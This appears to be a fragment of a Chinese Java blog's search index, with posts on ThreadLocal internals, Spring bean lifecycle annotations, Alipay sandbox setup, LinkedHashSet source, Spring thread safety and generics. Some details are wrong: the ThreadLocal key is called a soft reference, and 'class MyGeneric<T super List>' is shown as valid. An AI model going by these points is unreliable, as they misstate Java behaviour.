  </entry>
  <entry>
    <title><![CDATA[12、支付宝开发]]></title>
    <url>%2F2018%2F07%2F21%2F12%E3%80%81%E6%94%AF%E4%BB%98%E5%AE%9D%E5%BC%80%E5%8F%91%2F</url>
    <content type="text"><![CDATA[支付宝开发的第一步：添加依赖。 支付宝开发1————–&gt;支付宝开发1]]></content>
      <tags>
        <tag>电商项目实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[12.ThreadLocal自问自答]]></title>
    <url>%2F2018%2F07%2F21%2F12.ThreadLocal%E8%87%AA%E9%97%AE%E8%87%AA%E7%AD%94%2F</url>
    <content type="text"><![CDATA[继续深入对ThreadLocal的理解。在java多线程基础的最后，用两篇对ThreadLocal进行了讲解，但是还是觉得自己理解的略浅或者甚至不对，这里再次对其进行深入的理解，原文地址是：https://juejin.im/post/5a0e985df265da430e4ebb92。 问题1：ThreadLocal了解吗？您能给我说说他的主要用途吗？官方定位：ThreadLocal类用来提供线程内部的局部变量。这种变量在多线程环境下访问（通过get和set方法访问）时能保证各个线程的变量相对独立于其他线程内的变量。 简单归纳就是： ThreadLocal的作用是提供线程内的局部变量 这种变量在线程的生命周期内起作用 不同的线程之间不会相互干扰 问题2：ThreadLocal实现原理是什么，它是怎么样做到局部变量不同的线程之间不会相互干扰的？通常，如果我不去看源代码的话，我猜ThreadLocal是这样子设计的：每个ThreadLocal类都创建一个Map，然后用线程的ID threadID作为Map的key，要存储的局部变量作为Map的value，这样就能达到各个线程的值隔离的效果。这是最简单的设计方法，JDK最早期的ThreadLocal就是这样设计的。 但是，JDK后面优化了设计方案，现时JDK8 ThreadLocal的设计是：每个Thread维护一个ThreadLocalMap哈希表，这个哈希表的key是ThreadLocal实例本身，value才是真正要存储的值Object。 那么为什么不用上面个设计呢？多简单啊！ 如果用Map来做的话，只能是用thread+threadlocal计算出来作为key，毕竟我存的不一定只有一个变量。那么不用他的时候，如何清理呢？只能是手动remove掉，但是一方面很麻烦，另一方面代码很丑陋，最后一方面是在remove的时候突然出现问题，那么就可能导致内存泄漏。 新的设计的好处： 当Thread销毁之后，对应的ThreadLocalMap也会随之销毁，能减少内存的使用。 假设当前thread一直活着（比如赖在线程池中），有些无用的threadlocal对象怎么清理呢？ key是一个软引用指向ThreadLocal实例，特性是下一次gc的时候就会被回收掉了，ThreadLocalMap中就会出现key为null的Entry. key回收掉了，value值还在啊，这个怎么回收！！！ ThreadLocal的get和set方法每次调用时，如果发现当前的entry的key为null（也就是被回收掉了），最终会调用expungeStaleEntry(int staleSlot)方法，该方法会把哈希表当前位置的无用数据清理掉（当然还有别的操作）。 但是最佳实践还是每次使用完ThreadLocal，都调用它的remove()方法，清除数据,确保不会出现内存泄漏问题。 问题3：您能说说ThreadLocal常用操作的底层实现原理吗？如存储set(T value)，获取get()，删除remove()等操作。具体的代码就不贴了，核心代码都已经看过了。这里简单总结一下。 调用get() 获取当前线程Thread对象，进而获取此线程对象中维护的ThreadLocalMap对象。 判断当前的ThreadLocalMap是否存在,如果存在，则以当前的ThreadLocal 为 key，调用ThreadLocalMap中的getEntry方法获取对应的存储实体 e。找到对应的存储实体 e，获取存储实体 e 对应的 value值，即为我们想要的当前线程对应此ThreadLocal的值，返回结果值。 如果不存在，则证明此线程没有维护的ThreadLocalMap对象，调用setInitialValue方法进行初始化。返回setInitialValue初始化的值。 调用set(T value) 获取当前线程Thread对象，进而获取此线程对象中维护的ThreadLocalMap对象。 判断当前的ThreadLocalMap是否存在： 如果存在，则调用map.set设置此实体entry。 如果不存在，则调用createMap进行ThreadLocalMap对象的初始化，并将此实体entry作为第一个值存放至ThreadLocalMap中。 调用remove() 获取当前线程Thread对象，进而获取此线程对象中维护的ThreadLocalMap对象。 判断当前的ThreadLocalMap是否存在， 如果存在，则调用map.remove，以当前ThreadLocal为key删除对应的实体entry。 问题4：对ThreadLocal的常用操作实际是对线程Thread中的ThreadLocalMap进行操作，核心是ThreadLocalMap这个哈希表，你能谈谈ThreadLocalMap的内部底层实现吗?ThreadLocalMap的底层实现是一个定制的自定义HashMap哈希表，核心组成元素有： Entry[] table：底层哈希表 table,必要时需要进行扩容，底层哈希表 table.length 长度必须是2的n次方。 int size：实际存储键值对元素个数 entries int threshold：下一次扩容时的阈值，阈值 threshold = len(table) * 2 / 3。当 size &gt;= threshold 时，遍历table并删除key为null的元素，如果删除后size &gt;= threshold*3/4时，需要对table进行扩容 其中Entry[] table哈希表存储的核心元素是Entry，Entry包含： ThreadLocal&lt;?&gt; k：当前存储的ThreadLocal实例对象 Object value：当前 ThreadLocal 对应储存的值value 需要注意的是，此Entry继承了弱引用 WeakReference，所以在使用ThreadLocalMap时，发现key == null，则意味着此key ThreadLocal不在被引用，需要将其从ThreadLocalMap哈希表中移除。 问题5：ThreadLocalMap中的存储实体Entry使用ThreadLocal作为key，但这个Entry是继承弱引用WeakReference的，为什么要这样设计，使用了弱引用WeakReference会造成内存泄露问题吗？参考java基础第十一篇文章。 问题6：ThreadLocal和synchronized的区别?ThreadLocal和synchronized关键字都用于处理多线程并发访问变量的问题，只是二者处理问题的角度和思路不同。 ThreadLocal是一个Java类,通过对当前线程中的局部变量的操作来解决不同线程的变量访问的冲突问题。所以，ThreadLocal提供了线程安全的共享对象机制，每个线程都拥有其副本。 Java中的synchronized是一个保留字，它依靠JVM的锁机制来实现临界区的函数或者变量的访问中的原子性。在同步机制中，通过对象的锁机制保证同一时间只有一个线程访问变量。此时，被用作“锁机制”的变量时多个线程共享的。 同步机制(synchronized关键字)采用了以“时间换空间”的方式，提供一份变量，让不同的线程排队访问。而ThreadLocal采用了“以空间换时间”的方式，为每一个线程都提供一份变量的副本，从而实现同时访问而互不影响. 问题7：ThreadLocal在现时有什么应用场景？总的来说ThreadLocal主要是解决2种类型的问题： 解决并发问题：使用ThreadLocal代替synchronized来保证线程安全。同步机制采用了“以时间换空间”的方式，而ThreadLocal采用了“以空间换时间”的方式。前者仅提供一份变量，让不同的线程排队访问，而后者为每一个线程都提供了一份变量，因此可以同时访问而互不影响。 解决数据存储问题：ThreadLocal为变量在每个线程中都创建了一个副本，所以每个线程可以访问自己内部的副本变量，不同线程之间不会互相干扰。如一个Parameter对象的数据需要在多个模块中使用，如果采用参数传递的方式，显然会增加模块之间的耦合性。此时我们可以使用ThreadLocal解决。 一般的Web应用划分为展现层、服务层和持久层三个层次，在不同的层中编写对应的逻辑，下层通过接口向上层开放功能调用。在一般情况下，从接收请求到返回响应所经过的所有程序调用都同属于一个线程ThreadLocal是解决线程安全问题一个很好的思路，它通过为每个线程提供一个独立的变量副本解决了变量并发访问的冲突问题。在很多情况下，ThreadLocal比直接使用synchronized同步机制解决线程安全问题更简单，更方便，且结果程序拥有更高的并发性。 总结 ThreadLocal提供线程内部的局部变量，在本线程内随时随地可取，隔离其他线程。 ThreadLocal的设计是：每个Thread维护一个ThreadLocalMap哈希表，这个哈希表的key是ThreadLocal实例本身，value才是真正要存储的值Object。 对ThreadLocal的常用操作实际是对线程Thread中的ThreadLocalMap进行操作。 ThreadLocalMap的底层实现是一个定制的自定义哈希表，ThreadLocalMap的阈值threshold = 底层哈希表table的长度 len * 2 / 3，当实际存储元素个数size 大于或等于 阈值threshold的 3/4 时size &gt;= threshold*3/4，则对底层哈希表数组table进行扩容操作。 ThreadLocalMap中的哈希表Entry[] table存储的核心元素是Entry，存储的key是ThreadLocal实例对象，value是ThreadLocal 对应储存的值value。需要注意的是，此Entry继承了弱引用 WeakReference，所以在使用ThreadLocalMap时，发现key == null，则意味着此key ThreadLocal不在被引用，需要将其从ThreadLocalMap哈希表中移除。 ThreadLocalMap使用ThreadLocal的弱引用作为key，如果一个ThreadLocal没有外部强引用来引用它，那么系统 GC 的时候，这个ThreadLocal势必会被回收。所以，在ThreadLocal的get(),set(),remove()的时候都会清除线程ThreadLocalMap里所有key为null的value。如果我们不主动调用上述操作，则会导致内存泄露。 为了安全地使用ThreadLocal，必须要像每次使用完锁就解锁一样，在每次使用完ThreadLocal后都要调用remove()来清理无用的Entry。这在操作在使用线程池时尤为重要。 ThreadLocal和synchronized的区别：同步机制(synchronized关键字)采用了以“时间换空间”的方式，提供一份变量，让不同的线程排队访问。而ThreadLocal采用了“以空间换时间”的方式，为每一个线程都提供一份变量的副本，从而实现同时访问而互不影响。 ThreadLocal主要是解决2种类型的问题：A. 解决并发问题：使用ThreadLocal代替同步机制解决并发问题。B. 解决数据存储问题：如一个Parameter对象的数据需要在多个模块中使用，如果采用参数传递的方式，显然会增加模块之间的耦合性。此时我们可以使用ThreadLocal解决。]]></content>
      <tags>
        <tag>java基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[12.@PostConstruct&@PreDestory]]></title>
    <url>%2F2018%2F07%2F21%2F12.%40PostConstruct%26%40PreDestory%2F</url>
    <content type="text"><![CDATA[学习bean的初始化和销毁等。 @PostConstruct：bean创建好并且赋值好属性值之后执行一些初始化工作 @PreDestory：在容器销毁bean之前通知我们进行清理工作 123456789101112131415public class Pig&#123; public Pig()&#123; System.out.println("pig constructor..."); &#125; @PostConstruct public void init()&#123; System.out.println("pig init..."); &#125; @PreDestroy public void destory()&#123; System.out.println("pig destory..."); &#125;&#125; 一样的效果。]]></content>
      <tags>
        <tag>spring学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[11、支付宝demo测试]]></title>
    <url>%2F2018%2F07%2F21%2F11%E3%80%81%E6%94%AF%E4%BB%98%E5%AE%9Ddemo%E6%B5%8B%E8%AF%95%2F</url>
    <content type="text"><![CDATA[支付宝demo测试 1、沙箱登陆：https://openhome.alipay.com/platform/appDaily.htm?tab=info 2、沙箱环境使用说明：https://docs.open.alipay.com/200/105311/ 3、如何使用沙箱环境：https://support.open.alipay.com/support/hotProblemDetail.htm?spm=a219a.7386797.0.0.YhIJho&amp;source=search&amp;id=251932 4、当面付产品介绍：https://support.open.alipay.com/docs/doc.htm?spm=a219a.7629140.0.0.5HYMFg&amp;treeId=193&amp;articleId=105072&amp;docType=1 5、扫码支付接入指引：https://support.open.alipay.com/docs/doc.htm?spm=a219a.7629140.0.0.eZzwyB&amp;treeId=193&amp;articleId=106078&amp;docType=1 6、当面付快速接入：https://support.open.alipay.com/docs/doc.htm?spm=a219a.7629140.0.0.k84ZRs&amp;treeId=193&amp;articleId=105170&amp;docType=1 7、当面付接入必读：https://support.open.alipay.com/docs/doc.htm?spm=a219a.7629140.0.0.UUf8nV&amp;treeId=193&amp;articleId=105322&amp;docType=1 8、当面付进阶功能：https://support.open.alipay.com/docs/doc.htm?spm=a219a.7629140.0.0.DdxGEd&amp;treeId=193&amp;articleId=105190&amp;docType=1 9、当面付异步通知-仅用于扫码支付：https://support.open.alipay.com/docs/doc.htm?spm=a219a.7629140.0.0.Bj6VoE&amp;treeId=193&amp;articleId=103296&amp;docType=1 10、当面付SDK&amp;Demo：https://support.open.alipay.com/docs/doc.htm?spm=a219a.7629140.0.0.B4OyFM&amp;treeId=193&amp;articleId=105201&amp;docType=1 11、服务端SDK：https://docs.open.alipay.com/54/103419 12、生成RSA密钥：https://docs.open.alipay.com/291/105971 13、创建应用：https://docs.open.alipay.com/200/105310 14、签名验签工具：https://openclub.alipay.com/read.php?tid=955&amp;fid=46 支付宝Demo演示 下载支付宝的当面付demo: https://docs.open.alipay.com/54/104506/ 用Idea引入TradePayDemo这个项目 直接运行Main.java是报错的，我们需要配置zfbinfo.properties文件 1. 第一个配置支付宝网关即可：1open_api_domain = https://openapi.alipaydev.com/gateway.do 2. 第二行的配置不变：1mcloud_api_domain = http://mcloudmonitor.com/gateway.do 3. pid配置就是登陆支付宝沙箱环境之后的 商户UID4. appid就是对应的APPID5. RSA私钥、公钥和支付宝公钥的配置 首先需要去下载支付宝的RSA验签工具，见链接14。 下载对应系统的软件，解压。 windows下直接运行 RSA签名验签工具.bat ，直接生成即可。 将私钥放在private_key，公钥放在public_key。 6. #SHA256withRsa对应支付宝公钥的配置将上面生成的公钥放在RSA2(SHA256)密钥(推荐)中，页面刷新，会出现一个 查看支付宝公钥，将其打开复制放到这里来即可。 7. 运行主函数，会出现以下结果：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071一月 06, 2018 10:43:37 上午 com.alipay.demo.trade.config.Configs init信息: 配置文件名: zfbinfo.properties一月 06, 2018 10:43:37 上午 com.alipay.demo.trade.config.Configs init信息: Configs&#123;支付宝openapi网关: https://openapi.alipaydev.com/gateway.do, 支付宝mcloudapi网关域名: http://mcloudmonitor.com/gateway.do, pid: 2088102172437193, appid: 2016082100306095, 商户RSA私钥: MIIEvQ******dKWxg=, 商户RSA公钥: MIIBIj******IDAQAB, 支付宝RSA公钥: MIIBIj******IDAQAB, 签名类型: RSA2, 查询重试次数: 5, 查询间隔(毫秒): 5000, 撤销尝试次数: 3, 撤销重试间隔(毫秒): 2000, 交易保障调度延迟(秒): 5, 交易保障调度间隔(秒): 900&#125;一月 06, 2018 10:43:37 上午 com.alipay.demo.trade.service.impl.AbsAlipayTradeService tradePrecreate信息: trade.precreate bizContent: &#123; &quot;out_trade_no&quot;: &quot;tradeprecreate15152066176329550113&quot;, &quot;seller_id&quot;: &quot;&quot;, &quot;total_amount&quot;: &quot;0.01&quot;, &quot;undiscountable_amount&quot;: &quot;0&quot;, &quot;subject&quot;: &quot;xxx品牌xxx门店当面付扫码消费&quot;, &quot;body&quot;: &quot;购买商品3件共20.00元&quot;, &quot;goods_detail&quot;: [ &#123; &quot;goods_id&quot;: &quot;goods_id001&quot;, &quot;goods_name&quot;: &quot;xxx小面包&quot;, &quot;quantity&quot;: 1, &quot;price&quot;: &quot;10&quot; &#125;, &#123; &quot;goods_id&quot;: &quot;goods_id002&quot;, &quot;goods_name&quot;: &quot;xxx牙刷&quot;, &quot;quantity&quot;: 2, &quot;price&quot;: &quot;5&quot; &#125; ], &quot;operator_id&quot;: &quot;test_operator_id&quot;, &quot;store_id&quot;: &quot;test_store_id&quot;, &quot;extend_params&quot;: &#123; &quot;sys_service_provider_id&quot;: &quot;2088100200300400500&quot; &#125;, &quot;timeout_express&quot;: &quot;120m&quot; &#125;一月 06, 2018 10:43:40 上午 com.alipay.demo.trade.service.impl.AbsAlipayService getResponse信息: &#123; &quot;alipay_trade_precreate_response&quot;: &#123; &quot;code&quot;: &quot;10000&quot;, &quot;msg&quot;: &quot;Success&quot;, &quot;out_trade_no&quot;: &quot;tradeprecreate15152066176329550113&quot;, &quot;qr_code&quot;: &quot;https://qr.alipay.com/bax06399mdoc95eqlnpk0016&quot; &#125;, &quot;sign&quot;: &quot;F63Q9zK0fd0cXUkONm7TcH+1fZgblj2e7GD8p70h0YcgfOPjt0zQktDiCRwljEesGbK2hvS+9gn0ucJP+W6zoBpyABJFcghvrwRF7CPfOPsD9HDqK7FRYGS9siWhQK7jtpRf/vREvg/XTck/gbK1gpjAAi50IJEA2vfppPmiSDuY/e1Jw+0xMiQzXtcRpEO727XkJHmHiSI9VqlilxvdC9hj+u1qXhmNqkFzJG2z3Qc32jwQrPeLIXzT0JgVeTGTVcMB3Mp1501TrbFJTpA7h9QNKBFa0YKBSS6feKrQBz2+OPJ0gAoweBZ4AaCWo/tMhgx164/hNQSvn3IcG9HcdA==&quot; &#125;一月 06, 2018 10:43:40 上午 com.alipay.demo.trade.Main test_trade_precreate信息: 支付宝预下单成功: )一月 06, 2018 10:43:40 上午 com.alipay.demo.trade.Main dumpResponse信息: code:10000, msg:Success一月 06, 2018 10:43:40 上午 com.alipay.demo.trade.Main dumpResponse信息: body:&#123;&quot;alipay_trade_precreate_response&quot;:&#123;&quot;code&quot;:&quot;10000&quot;,&quot;msg&quot;:&quot;Success&quot;,&quot;out_trade_no&quot;:&quot;tradeprecreate15152066176329550113&quot;,&quot;qr_code&quot;:&quot;https:\/\/qr.alipay.com\/bax06399mdoc95eqlnpk0016&quot;&#125;,&quot;sign&quot;:&quot;F63Q9zK0fd0cXUkONm7TcH+1fZgblj2e7GD8p70h0YcgfOPjt0zQktDiCRwljEesGbK2hvS+9gn0ucJP+W6zoBpyABJFcghvrwRF7CPfOPsD9HDqK7FRYGS9siWhQK7jtpRf/vREvg/XTck/gbK1gpjAAi50IJEA2vfppPmiSDuY/e1Jw+0xMiQzXtcRpEO727XkJHmHiSI9VqlilxvdC9hj+u1qXhmNqkFzJG2z3Qc32jwQrPeLIXzT0JgVeTGTVcMB3Mp1501TrbFJTpA7h9QNKBFa0YKBSS6feKrQBz2+OPJ0gAoweBZ4AaCWo/tMhgx164/hNQSvn3IcG9HcdA==&quot;&#125;一月 06, 2018 10:43:40 上午 com.alipay.demo.trade.Main test_trade_precreate信息: filePath:/Users/sudo/Desktop/qr-tradeprecreate15152066176329550113.png 在第二段格式化的json数据中有一个 “qr_code”: “https://qr.alipay.com/bax06399mdoc95eqlnpk0016&quot; ，这就是支付宝生成的付款二维码。 我们将其复制到二维码生成工具中，即可生成一个二维码，用支付宝沙箱app扫码即可完成支付测试。 8、server运行因为本身的demo就是一个web项目，所以配置tomcat即可运行。如果发现不能找到 artifact，需要在 Project Structure 中配置一下artifacts。运行起来就可以模拟支付了。]]></content>
      <tags>
        <tag>电商项目实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[11、LinkedHashSet源码解析]]></title>
    <url>%2F2018%2F07%2F21%2F11%E3%80%81LinkedHashSet%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90%2F</url>
    <content type="text"><![CDATA[本文分析LinkedHashSet源码. 关注点 结论 HashSet是否允许空 允许 HashSet是否允许重复数据 不允许重复 HashSet是否有序 有序 HashSet是否线程安全 非线程安全 HashSet和LinkedHashSet的关系类似于HashMap和LinkedHashMap的关系，即后者维护双向链表，实现迭代顺序可为插入顺序或是访问顺序。 从源码中可以看到其空的构造函数为： 123public LinkedHashSet() &#123; super(16, .75f, true);&#125; 这个super即父类是HashSet，从它的继承关系就可以显然看到： 123public class LinkedHashSet&lt;E&gt; extends HashSet&lt;E&gt; implements Set&lt;E&gt;, Cloneable, java.io.Serializable 那么HashSet内部的数据结构就是一个 HashMap，其方法的内部几乎就是在调用 HashMap 的方法。 LinkedHashSet 首先我们需要知道的是它是一个 Set 的实现，所以它其中存的肯定不是键值对，而是值。此实现与 HashSet 的不同之处在于，LinkedHashSet 维护着一个运行于所有条目的双重链接列表。 注意，此实现不是同步的。如果多个线程同时访问链接的HashSet，而其中至少一个线程修改了该 Set，则它必须保持外部同步。 一、 示例HashSet的遍历：123456789101112public static void main(String[] args) &#123; Set&lt;String&gt; linkedHashSet = new HashSet&lt;&gt;(); linkedHashSet.add("aaa"); linkedHashSet.add("eee"); linkedHashSet.add("ccc"); linkedHashSet.add("bbb"); Iterator&lt;String&gt; it = linkedHashSet.iterator(); while(it.hasNext())&#123; System.out.println(it.next()); &#125;&#125; 输出结果是： aaacccbbbeee LinkedHashSet的遍历：1234567891011121314public static void main(String[] args) &#123; Set&lt;String&gt; linkedHashSet = new LinkedHashSet&lt;&gt;(); linkedHashSet.add("aaa"); linkedHashSet.add("eee"); linkedHashSet.add("ccc"); linkedHashSet.add("bbb"); linkedHashSet.add(null); Iterator&lt;String&gt; it = linkedHashSet.iterator(); while(it.hasNext())&#123; System.out.println(it.next()); &#125; &#125; 输出结果是： aaaeeecccbbbnull可以看到与输入顺序是一致的。 原理其实与LinkedHashMap是一样的，这里加深印象，找到一张图理解其工作过程。 二、源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748public class LinkedHashSet&lt;E&gt; extends HashSet&lt;E&gt; implements Set&lt;E&gt;, Cloneable, java.io.Serializable &#123; private static final long serialVersionUID = -2851667679971038690L; /** * 构造一个带有指定初始容量和加载因子的新空链接哈希set。 * * 底层会调用父类的构造方法，构造一个有指定初始容量和加载因子的LinkedHashMap实例。 * @param initialCapacity 初始容量。 * @param loadFactor 加载因子。 */ public LinkedHashSet(int initialCapacity, float loadFactor) &#123; super(initialCapacity, loadFactor, true); &#125; /** * 构造一个带指定初始容量和默认加载因子0.75的新空链接哈希set。 * * 底层会调用父类的构造方法，构造一个带指定初始容量和默认加载因子0.75的LinkedHashMap实例。 * @param initialCapacity 初始容量。 */ public LinkedHashSet(int initialCapacity) &#123; super(initialCapacity, .75f, true); &#125; /** * 构造一个带默认初始容量16和加载因子0.75的新空链接哈希set。 * * 底层会调用父类的构造方法，构造一个带默认初始容量16和加载因子0.75的LinkedHashMap实例。 */ public LinkedHashSet() &#123; super(16, .75f, true); &#125; /** * 构造一个与指定collection中的元素相同的新链接哈希set。 * * 底层会调用父类的构造方法，构造一个足以包含指定collection * 中所有元素的初始容量和加载因子为0.75的LinkedHashMap实例。 * @param c 其中的元素将存放在此set中的collection。 */ public LinkedHashSet(Collection&lt;? extends E&gt; c) &#123; super(Math.max(2*c.size(), 11), .75f, true); addAll(c); &#125;&#125; 在父类HashSet中，专为LinkedHashSet提供的构造方法如下，该方法为包访问权限，并未对外公开。123456789101112/** * 以指定的initialCapacity和loadFactor构造一个新的空链接哈希集合。 * 此构造函数为包访问权限，不对外公开，实际只是是对LinkedHashSet的支持。 * * 实际底层会以指定的参数构造一个空LinkedHashMap实例来实现。 * @param initialCapacity 初始容量。 * @param loadFactor 加载因子。 * @param dummy 标记。 */ HashSet(int initialCapacity, float loadFactor, boolean dummy) &#123; map = new LinkedHashMap&lt;E,Object&gt;(initialCapacity, loadFactor); &#125;]]></content>
      <tags>
        <tag>java容器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[11.多线程并发拓展]]></title>
    <url>%2F2018%2F07%2F21%2F11.%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%B9%B6%E5%8F%91%E6%8B%93%E5%B1%95%2F</url>
    <content type="text"><![CDATA[这里着重探讨spring与线程安全的关系以及HashMap死锁问题。 1. 死锁在之前已经整理过死锁相关的知识，这里不再赘述。 2. 回顾总结 多线程并发最佳实践 使用本地变量 使用不可变类 最小化锁的作用域范围 使用线程池的Excutor，而不是直接new Thread执行 宁可使用同步(countdownLatch,BlockingQueue等)也不要使用线程的wait和notify 使用BlockingQueue实现生产-消费模型 使用并发集合而不是加了锁的同步集合Collections.synchronized 使用Semaphore创建有界的访问 宁可使用同步代码块，也不使用同步方法 避免使用静态变量 3. spring与线程安全3.1 spring保证对象的线程安全吗？ Spring作为一个IOC/DI容器，帮助我们管理了许许多多的bean。但其实，Spring并没有保证这些对象的线程安全，需要由开发者自己编写解决线程安全问题的代码。 3.2 bean的作用域？ Spring对每个bean提供了一个scope属性来表示该bean的作用域。它是bean的生命周期。例如，一个scope为singleton的bean，在第一次被注入时，会创建为一个单例对象，该对象会一直被复用到应用结束。 singleton：默认的scope，每个scope为singleton的bean都会被定义为一个单例对象，该对象的生命周期是与Spring IOC容器一致的（但在第一次被注入时才会创建）。 prototype：bean被定义为在每次注入时都会创建一个新的对象。 request：bean被定义为在每个HTTP请求中创建一个单例对象，也就是说在单个请求中都会复用这一个单例对象。 session：bean被定义为在一个session的生命周期内创建一个单例对象。 application：bean被定义为在ServletContext的生命周期中复用一个单例对象。 websocket：bean被定义为在websocket的生命周期中复用一个单例对象。 我们交由Spring管理的大多数对象其实都是一些无状态的对象，这种不会因为多线程而导致状态被破坏的对象很适合Spring的默认scope，每个单例的无状态对象都是线程安全的（也可以说只要是无状态的对象，不管单例多例都是线程安全的，不过单例毕竟节省了不断创建对象与GC的开销）。 3.3 什么是无状态的对象？为什么是线程安全的？、 无状态的对象即是自身没有状态的对象，自然也就不会因为多个线程的交替调度而破坏自身状态导致线程安全问题。无状态对象包括我们经常使用的DO、DTO、VO这些只作为数据的实体模型的贫血对象，还有Service、DAO和Controller，这些对象并没有自己的状态，它们只是用来执行某些操作的。例如，每个DAO提供的函数都只是对数据库的CRUD，而且每个数据库Connection都作为函数的局部变量（局部变量是在用户栈中的，而且用户栈本身就是线程私有的内存区域，所以不存在线程安全问题），用完即关（或交还给连接池）。 更加通俗的理解无状态对象： 无状态的对象，是一个对象，并且这个对象没有状态！ 通常情况，几乎所有对象都有状态， 比如一个人，按照不同的情况有多种状态，比如高矮、胖瘦、黑白、高富帅穷矮挫。 比如一个杯子，玻璃的还是塑料，圆的还是方的。 你可以想一下，生活中哪些对象是无状态的？ 抽象到程序设计中，无状态的对象，我们往往仅仅考虑对象的一个切面， 比如一个User，有多个属性，Name，Age等等，只要你认为这些属性的变化对User的唯一认定没有影响，那这些属性，就不会影响User的状态，意思是说这个User的状态我不关心这些属性，那这些属性的变更不能成为影响User的状态的必要因素。 比如User一个Age达到18岁了，我认为这个User的状态变化了，是成年人了，那么这个User是有状态的，状态就是是否成年，活着你认为Age多少岁无关紧要，那么这个User就是没有状态的。 对象状态的变化一般是由你关心的某属性变化引起的，无状态的对象一般是不可变对象，不可变对象是线程安全的。 如Service层、Dao层用默认singleton就行，虽然Service类也有dao这样的属性，但dao这些类都是没有状态信息的，也就是相当于不变(immutable)类，所以不影响。 有人可能会认为，我使用request作用域不就可以避免每个请求之间的安全问题了吗？这是完全错误的，因为Controller默认是单例的，一个HTTP请求是会被多个线程执行的，这就又回到了线程的安全问题。当然，你也可以把Controller的scope改成prototype，实际上Struts2就是这么做的，但有一点要注意，Spring MVC对请求的拦截粒度是基于每个方法的，而Struts2是基于每个类的，所以把Controller设为多例将会频繁的创建与回收对象，严重影响到了性能。 Spring根本就没有对bean的多线程安全问题做出任何保证与措施。对于每个bean的线程安全问题，根本原因是每个bean自身的设计。不要在bean中声明任何有状态的实例变量或类变量，如果必须如此，那么就使用ThreadLocal把变量变为线程私有的，如果bean的实例变量或类变量需要在多个线程之间共享，那么就只能使用synchronized、lock、CAS等这些实现线程同步的方法了。 ThreadLocal是一个很好用的工具类，它在某些情况下解决了线程安全问题（在变量不需要被多个线程共享时）。ThreadLocal会为每一个线程提供一个独立的变量副本，从而隔离了多个线程对数据的访问冲突。因为每一个线程都拥有自己的变量副本，从而也就没有必要对该变量进行同步了。ThreadLocal提供了线程安全的共享对象，在编写多线程代码时，可以把不安全的变量封装进ThreadLocal。 http://www.importnew.com/27440.html 3.4 spring的controller默认是单例还是多例?spring的controller默认是单例: 为了性能:单例不用每次都new，当然快 不需要多例:只要controller中不定义属性，那么单例完全是安全的,否则就要进行同步机制来保证线程安全。 spring默认的注入也是单例的，所以也存在线程安全问题。 3.5 springMVC与struts2的区别 机制：spring mvc的入口是servlet，而struts2是filter，这样就导致了二者的机制不同。 性能：spring会稍微比struts快。spring mvc是基于方法的设计，而sturts是基于类。 sturts:每次发一次请求都会实例一个action，每个action都会被注入属性，而spring基于方法，粒度更细，但要小心把握像在servlet控制数据一样。 参数传递：struts是在接受参数的时候，可以用属性来接受参数，这就说明参数是让多个方法共享的。 intercepter的实现机制：struts有以自己的interceptor机制，spring mvc用的是独立的AOP方式。 4. HashMap和ConcurrentHashMap4.1 HashMap在多线程环境下的死循环问题单线程下rehash： 多线程下就会出现问题： 第一个阶段： 第二个阶段：线程1继续往下执行 那么此时数组索引1处指向了5. 第三个阶段：线程1继续往下执行，由于第一个阶段，next是指向9的，此时数组索引1指向了9。 第四个阶段：线程1继续往下执行，上一个阶段next指向5，所以此时数组索引1指向了5.next指向null. 此时，由于上面是9指向5，现在5又指向了9，构成了死循环。 有点绕，但是简单来说，就是，一开始槽1指向5，next指向9；下面，槽1指向9，但是因为另一个线程9的next是5，所以next指向5，即9.next=5；最后，槽1又指向5，即5插在上一步的槽1和9中间，此时5.next=9；那么死循环就形成了。 4.2 ConcurrentHashMap-jdk7实现 4.3 ConcurrentHashMap-jdk8实现 具体的原理在jdk源码分析中详细探讨。]]></content>
      <tags>
        <tag>java并发进阶</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[11.关于泛型的补充]]></title>
    <url>%2F2018%2F07%2F21%2F11.%E5%85%B3%E4%BA%8E%E6%B3%9B%E5%9E%8B%E7%9A%84%E8%A1%A5%E5%85%85%2F</url>
    <content type="text"><![CDATA[对于泛型知识的补充。 简单回顾泛型的原理和一些特性类型擦除(Type Erasure) Java 的泛型是在编译器层次实现的。 在编译生成的字节码中不包含泛型中的类型参数，类型参数会在编译时去掉。 例如：List&lt;String&gt; 和 List&lt;Integer&gt; 在编译后都变成 List。 类型擦除的基本过程：将代码中的类型参数替换为具体的类，同时去掉 &lt;&gt; 的内容。 泛型的优势 编译时更强大的类型检测。 例如如下代码：方法传入一个String对象，传出一个String 对象，并强制转换为Integer对象。这段代码编译可以通过，因为都是Object的子类，但是运行时会产生ClassCastException。 1234567public static Object setAndReturn(Object obj) &#123; return obj;&#125;public static void main(String[] args) &#123; Integer i = (Integer) setAndReturn(new String("abc"));//运行报错&#125; 而如果通过泛型来实现，则会在编译时进行类型的检测。例如如下代码：会产生编译错误。 1234567public static &lt;T&gt; T setAndReturn(T t) &#123; return t;&#125;public static void main(String[] args) &#123; Integer i = (Integer) setAndReturn(new String("abc"));//编译报错&#125; 提供自动和隐式的类型转换 12345678public static &lt;T&gt; T setAndReturn(T t) &#123; return t;&#125;public static void main(String[] args) &#123; // 不需要使用 = &lt;Integer&gt;setAndReturn(new Integer("123")); Integer i = setAndReturn(new Integer("123"));&#125; &lt;T&gt; VS &lt;?&gt;不同点： &lt;T&gt;用于泛型的定义，例如class MyGeneric&lt;T&gt; {...} &lt;?&gt;用于泛型的声明，即泛型的使用，例如MyGeneric&lt;?&gt; g = new MyGeneric&lt;&gt;(); 相同点：都可以指定上界和下界: 12345class MyGeneric&lt;T extends Collection&gt; &#123;...&#125;class MyGeneric&lt;T super List&gt; &#123;...&#125;MyGeneric&lt;? extends Collection&gt; g = new MyGeneric&lt;&gt;();MyGeneric&lt;? super List&gt; g = new MyGeneric&lt;&gt;(); &lt;?&gt;不同于&lt;Object&gt; 